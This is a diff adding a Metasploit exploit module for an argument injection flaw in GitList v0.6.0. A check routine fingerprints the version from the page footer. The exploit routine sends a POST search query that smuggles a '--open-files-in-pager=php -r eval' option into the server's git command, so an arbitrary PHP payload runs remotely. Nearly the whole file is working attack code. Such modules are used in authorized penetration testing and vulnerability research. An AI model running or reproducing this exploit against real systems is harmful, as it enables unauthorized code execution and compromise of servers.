@@ -1,0 +1,67 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "GitList v0.6.0 Argument Injection Vulnerability",
+      'Description'    => %q{
+        This module exploits an argument injection vulnerability in GitList v0.6.0.
+        The vulnerability arises from GitList improperly validating input using the php function
+        'escapeshellarg'.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Kacper Szurek', # EDB POC
+          'Shelby Pace'    # Metasploit Module
+        ],
+      'References'     =>
+        [
+          [ 'EDB', '44548' ],
+          [ 'URL', 'https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html']
+        ],
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        =>
+        [
+          [ 'GitList v0.6.0', { } ]
+        ],
+      'Privileged'     => false,
+      'Payload'        => { 'BadChars' => '\'"' },
+      'DisclosureDate' => "Apr 26 2018",
+      'DefaultTarget'  => 0))
+  end
+
+  def check
+    uri = normalize_uri(target_uri.path, '/gitlist/')
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     => uri
+    )
+
+    if res && res.code == 200 && /Powered by .*GitList 0\.6\.0/.match(res.body)
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    postUri = normalize_uri(target_uri.path, '/gitlist/tree/c/search')
+    cmd = '--open-files-in-pager=php -r "eval(\\"'
+    cmd << payload.encoded
+    cmd << '\\");"'
+    send_request_cgi(
+      'method' => 'POST',
+      'uri'    => postUri,
+      'vars_post' => { 'query' => cmd }
+    )
+  end
+end
